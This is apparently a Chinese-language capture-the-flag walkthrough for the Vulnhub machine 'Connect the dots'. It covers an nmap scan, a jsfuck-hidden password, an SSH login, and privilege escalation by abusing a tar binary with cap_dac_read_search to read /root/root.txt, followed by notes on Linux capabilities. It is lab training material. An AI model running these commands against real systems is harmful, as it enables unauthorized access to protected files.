---
layout: post
title: "Connect the dots walkthrough"
date: 2021-07-02
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机           | IP              |
| ---------------- | --------------- |
| 本机（Win10）    | `192.168.1.115` |
| Kali             | `192.168.1.116` |
| Connect the dots | `192.168.1.117` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.1.117`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.1.117
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-02 07:48 UTC
Nmap scan report for 192.168.1.117
Host is up (0.0042s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 2.0.8 or later
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Landing Page
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40719/udp6  mountd
|   100005  1,2,3      41963/tcp6  mountd
|   100005  1,2,3      49183/udp   mountd
|   100005  1,2,3      53937/tcp   mountd
|   100021  1,3,4      33367/tcp6  nlockmgr
|   100021  1,3,4      37147/udp6  nlockmgr
|   100021  1,3,4      44843/tcp   nlockmgr
|   100021  1,3,4      57886/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
7822/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 38:4f:e8:76:b4:b7:04:65:09:76:dd:23:4e:b5:69:ed (RSA)
|   256 ac:d2:a6:0f:4b:41:77:df:06:f0:11:d5:92:39:9f:eb (ECDSA)
|_  256 93:f7:78:6f:cc:e8:d4:8d:75:4b:c2:bc:13:4b:f0:dd (ED25519)
34777/tcp open  mountd   1-3 (RPC #100005)
44843/tcp open  nlockmgr 1-4 (RPC #100021)
53937/tcp open  mountd   1-3 (RPC #100005)
58755/tcp open  mountd   1-3 (RPC #100005)
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

从结果可知靶机开启了ftp，rpc，http服务器以及将默认22端口的ssh服务绑定在**7822**端口上。

在信息收集阶段，除了获取服务器端的信息，还包括网站的指纹识别。其中经过*dirb*目录枚举后，发现根目录下存在*backups*文件，下载后没有发现什么有用信息，并且在*/manual/*目录下是apache 2.4的开发文档。最后在*/index.htm*文件中发现泄露的注释信息，从该信息中知道了目录枚举没有爆破出来的路径：`http://192.168.1.117/mysite/register.html`。并且发现在该页面下的bootstrap框架代码文件中存在jsfuck代码。

经过[jsfuck](http://www.jsfuck.com/)网站解码，得到结果：`You're smart enough to understand me. Here's your secret, TryToGuessThisNorris@2k19`，其中包含一串secret值。之后根据根目录下的提示猜测用户名为：`norris`

### Getshell

使用用户名和密码`norris:TryToGuessThisNorris@2k19`登录到ssh服务器。

```shell
┌──(root💀kali)-[~]
└─# ssh norris@192.168.1.117 -p 7822
The authenticity of host '[192.168.1.117]:7822 ([192.168.1.117]:7822)' can't be established.
ECDSA key fingerprint is SHA256:JK6+YY5U5vuE7DXk+tJBZFRPsa+G7KOZ366/v9ipWSE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.1.117]:7822' (ECDSA) to the list of known hosts.
norris@192.168.1.117's password:
...
norris@sirrom:~$ id
uid=1001(norris) gid=1001(norris) groups=1001(norris),27(sudo)
```

并在该目录下得到第一个flag。

```shell
norris@sirrom:~$ cat user.txt
2c2836a138c0e7f7529aa0764a6414d0
```

通过常用方法查找具备SUID权限的脚本文件时发现没什么需要注意的地方，不过在通过上传并执行*LinEnum.sh*脚本文件后，查看更详细的信息时发现*/usr/bin/tar*脚本程序存在**读**权能

```shell
...
[+] Files with POSIX capabilities set:
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/tar = cap_dac_read_search+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/ping = cap_net_raw+ep
...
```

> Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作

### 提权

```shell
norris@sirrom:~$ /usr/bin/tar -cvf rootfile.tar /root/root.txt
/usr/bin/tar: Removing leading `/' from member names
/root/root.txt
norris@sirrom:~$ ls
ftp  LinEnum.sh  rootfile.tar  user.txt
norris@sirrom:~$ tar -xvf rootfile.tar
root/root.txt
norris@sirrom:~$ ls
ftp  LinEnum.sh  root  rootfile.tar  user.txt
norris@sirrom:~$ cd root
norris@sirrom:~/root$ ls
root.txt
norris@sirrom:~/root$ cat root.txt
8fc9376d961670ca10be270d52eda423
```

### 总结

Linux内核引入能力(capability)概念的目的就是使得普通用户也可以做只有超级用户可以完成的工作。

其中只有进程和可执行文件才具有能力：

1. 每个**进程**拥有三组能力集，分别称为：

   - cap_effective（pE）：表示进程当前可用的能力集
   - cap_inheritable（pI）：表示进程可以传递给其子进程的能力集
   - cap_permitted(pP)：表示进程所拥有的最大能力集

   系统根据进程的cap_effective能力集进行访问控制，cap_effective为cap_permitted的子集，进程可以通过取消cap_effective中的某些能力来放弃进程的一些特权。

2. **可执行文件**也拥有三组能力集，对应于进程的三组能力集，分别称为：

   - cap_effective（fE）：表示文件开始运行时可以使用的能力
   - cap_allowed（fI）：表示程序运行时可从原进程的cap_inheritable中集成的能力集
   - cap_forced（fP）：表示运行文件时必须拥有才能完成其服务的能力集

